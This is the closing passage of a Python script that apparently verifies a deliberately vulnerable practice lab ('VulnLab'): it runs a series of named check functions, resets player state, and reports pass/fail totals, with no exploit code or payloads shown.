          "{} solved, score {}".format(len(solved), d.get("score")))
    check("root flag accepted", "boot-02" in solved,
          "boot-02 " + ("in" if "boot-02" in solved else "missing"))


def teardown():
    """Leave the lab as a player should find it (shared implementation)."""
    removed = config.reset_player_state()
    if removed:
        print()
        print(" teardown: removed " + ", ".join(removed))
    return removed


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--fast", action="store_true", help="skip flag round-trip")
    ap.add_argument("--no-clean", action="store_true",
                    help="keep the artefacts this run plants (for debugging)")
    args = ap.parse_args()

    print("=" * 72)
    print(" VulnLab verification")
    print("=" * 72)
    check_ports()
    reachable()
    web_exploits()
    xss_checks()
    browser_checks()
    portal_checks()
    portal_entry_points()
    if not args.fast:
        scoreboard_roundtrip()
    if not args.no_clean:
        teardown()
    print()
    print("=" * 72)
    print(" {} passed, {} failed".format(len(PASS), len(FAIL)))
    for name in FAIL:
        print("  FAILED: {}".format(name))
    print("=" * 72)
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())